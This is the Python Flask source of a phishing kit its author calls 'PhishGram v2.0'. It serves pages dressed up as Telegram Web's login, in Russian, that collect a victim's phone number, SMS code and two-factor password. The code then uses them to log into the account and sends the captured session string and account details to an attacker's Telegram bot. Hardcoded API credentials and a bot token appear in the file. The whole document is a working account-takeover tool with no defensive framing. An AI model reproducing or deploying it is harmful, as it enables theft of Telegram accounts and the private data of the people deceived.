from flask import Flask, render_template_string, request, session as flask_session, redirect, url_for
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import StringSession
import requests
import re
import os
import uuid

app = Flask(__name__)
app.secret_key = 'ph1shgram_fixed_2026'

# ТВОИ ДАННЫЕ
API_ID = 37839268
API_HASH = '02f22349d03ee117dee396f65bcc56da'
BOT_TOKEN = '8791356428:AAGCZzEnZ5_4YxOMfajeZR4uJzZ9J81VSNg'
CHAT_ID = '7489815425'

# Состояния
auth_states = {}

def send_to_bot(message):
    """Отправка в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID, 
            "text": message, 
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        requests.post(url, data=data, timeout=10)
        print(f"✅ Отправлено в бот: {message[:100]}...")
    except:
        print("❌ Ошибка отправки в бот")

def capture_session(phone, code, password=None):
    """Захват сессии (sync версия)"""
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.start()
        
        if not client.is_user_authorized():
            client.send_code_request(phone)
            client.sign_in(phone, code)
        
        if password and not client.is_user_authorized():
            client.sign_in(password=password)
        
        # Сессия + инфа
        session_str = client.session.save()
        me = client.get_me()
        
        info = f"""🎣 <b>🆕 НОВАЯ СЕССИЯ TELEGRAM!</b>

👤 <b>{me.first_name or ''} {me.last_name or ''}</b>
📱 <b>{phone}</b>
🆔 <b>ID: {me.id}</b>
🔗 <b>@{me.username or 'нет'}</b>

💾 <b>SESSION STRING:</b>
<code>{session_str}</code>

📱 <b>Импорт:</b> StringSession('{session_str}')"""
        
        send_to_bot(info)
        client.disconnect()
        return True
        
    except PhoneCodeInvalidError:
        send_to_bot(f"❌ Неверный код: <code>{phone}</code> | Код: <code>{code}</code>")
    except SessionPasswordNeededError:
        return False  # Нужен пароль 2FA
    except Exception as e:
        send_to_bot(f"❌ Ошибка {phone}: <code>{str(e)}</code>")
    return False

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone = request.form['phone'].strip().replace(' ', '').replace('-', '')
        if re.match(r'^\+?\d{10,15}$', phone):
            phone = f"+{phone.lstrip('+')}"
            sid = str(uuid.uuid4())[:8]
            flask_session['sid'] = sid
            auth_states[sid] = {'phone': phone, 'step': 'code'}
            return code_page(phone)
    
    return main_page()

@app.route('/code', methods=['POST'])
def code_page_route():
    sid = flask_session.get('sid')
    if not sid or sid not in auth_states:
        return redirect(url_for('index'))
    
    state = auth_states[sid]
    phone = state['phone']
    code = request.form['code'].strip()
    
    if len(code) < 5:
        return code_page(phone, "Код должен содержать 5-6 цифр")
    
    state['code'] = code
    
    # Пробуем авторизоваться
    if capture_session(phone, code):
        del auth_states[sid]
        del flask_session['sid']
        return success_page()
    else:
        # Проверяем нужен ли 2FA
        state['step'] = '2fa'
        return twofa_page(phone)
    
    return code_page(phone)

@app.route('/2fa', methods=['POST'])
def twofa_route():
    sid = flask_session.get('sid')
    if not sid or sid not in auth_states:
        return redirect(url_for('index'))
    
    state = auth_states[sid]
    phone = state['phone']
    code = state['code']
    password = request.form['password']
    
    if capture_session(phone, code, password):
        del auth_states[sid]
        del flask_session['sid']
        return success_page()
    
    return twofa_page(phone, "Неверный пароль 2FA")

# HTML страницы
CSS = """
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif}
body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;border-radius:24px;box-shadow:0 24px 48px rgba(0,0,0,.15);padding:48px;max-width:400px;width:100%}
.logo{text-align:center;margin-bottom:32px}
.logo svg{width:72px;height:72px;fill:#0088cc}
h1{color:#1c1c1e;font-size:28px;font-weight:600;margin-bottom:12px;text-align:center}
.subtext{color:#8e8e93;text-align:center;margin-bottom:32px;font-size:16px;line-height:1.4}
.form-group{margin-bottom:24px}
label{display:block;margin-bottom:8px;color:#1c1c1e;font-weight:500;font-size:15px}
input{width:100%;padding:16px;border:2px solid #e5e5e7;border-radius:16px;font-size:17px;transition:all .2s}
input:focus{outline:none;border-color:#007aff;box-shadow:0 0 0 4px rgba(0,122,255,.1)}
.btn{width:100%;padding:16px;background:#007aff;color:#fff;border:none;border-radius:16px;font-size:17px;font-weight:600;cursor:pointer;transition:all .2s}
.btn:hover{background:#0056b3;transform:translateY(-1px)}
.phone-display{background:#f2f2f7;padding:16px;border-radius:12px;text-align:center;font-weight:600;margin:24px 0;font-family:monospace}
.error{color:#ff3b30;font-size:15px;margin-bottom:16px;text-align:center;padding:12px;background:rgba(255,59,48,.1);border-radius:12px}
.success{color:#34c759;font-size:24px;text-align:center;margin:32px 0}
</style>
"""

def main_page():
    return f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram Web</title>{CSS}</head>
<body>
<div class="box">
<div class="logo"><svg viewBox="0 0 48 48"><path d="M24 0C10.7 0 0 10.7 0 24s10.7 24 24 24 24-10.7 24-24S37.3 0 24 0zm11.4 32.3l-2.9-14.5-6.5 6.1-4.8-4.2-5.7 5.7V28c0 .9.1 1.7.4 2.5.5.8 1.2 1.5 2.1 1.9 2.1.9 4.3-.4 5.2-2.5l1.4-5.3 4.1 3.8 8.7-1.1c1.1-.1 2-.9 2.1-2 .1-1.1-.4-2.1-1.4-2.3z"/></svg></div>
<h1>Telegram</h1>
<p class="subtext">Продолжите в Telegram Web</p>
<form method="POST">
<div class="form-group">
<label>Номер телефона</label>
<input type="tel" name="phone" placeholder="+7 999 123-45-67" required>
</div>
<button class="btn" type="submit">Далее</button>
</form>
</div>
</body></html>
"""

def code_page(phone, error=""):
    err_html = f'<div class="error">{error}</div>' if error else ""
    return f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram - Код</title>{CSS}</head>
<body>
<div class="box">
<div class="logo"><svg viewBox="0 0 48 48"><path d="M24 0C10.7 0 0 10.7 0 24s10.7 24 24 24 24-10.7 24-24S37.3 0 24 0zm11.4 32.3l-2.9-14.5-6.5 6.1-4.8-4.2-5.7 5.7V28c0 .9.1 1.7.4 2.5.5.8 1.2 1.5 2.1 1.9 2.1.9 4.3-.4 5.2-2.5l1.4-5.3 4.1 3.8 8.7-1.1c1.1-.1 2-.9 2.1-2 .1-1.1-.4-2.1-1.4-2.3z"/></svg></div>
<h1>Подтверждение номера</h1>
<p class="subtext">Код отправлен на ваш телефон</p>
{err_html}
<div class="phone-display">{phone}</div>
<form method="POST" action="/code">
<div class="form-group">
<label>Код из SMS</label>
<input type="text" name="code" maxlength="6" pattern="[0-9]{{5,6}}" placeholder="12345" required autofocus>
</div>
<button class="btn" type="submit">Подтвердить</button>
</form>
</div>
</body></html>
"""

def twofa_page(phone, error=""):
    err_html = f'<div class="error">{error}</div>' if error else ""
    return f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram - 2FA</title>{CSS}</head>
<body>
<div class="box">
<div class="logo"><svg viewBox="0 0 48 48"><path d="M24 0C10.7 0 0 10.7 0 24s10.7 24 24 24 24-10.7 24-24S37.3 0 24 0zm11.4 32.3l-2.9-14.5-6.5 6.1-4.8-4.2-5.7 5.7V28c0 .9.1 1.7.4 2.5.5.8 1.2 1.5 2.1 1.9 2.1.9 4.3-.4 5.2-2.5l1.4-5.3 4.1 3.8 8.7-1.1c1.1-.1 2-.9 2.1-2 .1-1.1-.4-2.1-1.4-2.3z"/></svg></div>
<h1>Двухфакторная защита</h1>
<p class="subtext">Введите пароль двухэтапной верификации</p>
<div class="phone-display">{phone}</div>
{err_html}
<form method="POST" action="/2fa">
<div class="form-group">
<label>Пароль 2FA</label>
<input type="password" name="password" placeholder="******" required>
</div>
<button class="btn" type="submit">Войти</button>
</form>
</div>
</body></html>
"""

def success_page():
    return f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram</title>{CSS}</head>
<body>
<div class="box">
<div class="logo"><svg viewBox="0 0 48 48"><path d="M24 0C10.7 0 0 10.7 0 24s10.7 24 24 24 24-10.7 24-24S37.3 0 24 0zm11.4 32.3l-2.9-14.5-6.5 6.1-4.8-4.2-5.7 5.7V28c0 .9.1 1.7.4 2.5.5.8 1.2 1.5 2.1 1.9 2.1.9 4.3-.4 5.2-2.5l1.4-5.3 4.1 3.8 8.7-1.1c1.1-.1 2-.9 2.1-2 .1-1.1-.4-2.1-1.4-2.3z"/></svg></div>
<div class="success">✅ Добро пожаловать!</div>
<p style="text-align:center;color:#8e8e93;margin:24px 0;font-size:16px">Вход выполнен успешно</p>
<script>setTimeout(()=>{{
    window.location.href = '/';
}}, 2000);</script>
</div>
</body></html>
"""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('DEBUG', 'false').lower() == 'true'
    print("🚀 PhishGram v2.0 - Готов к работе!")
    print(f"🌐 http://0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port, debug=debug)
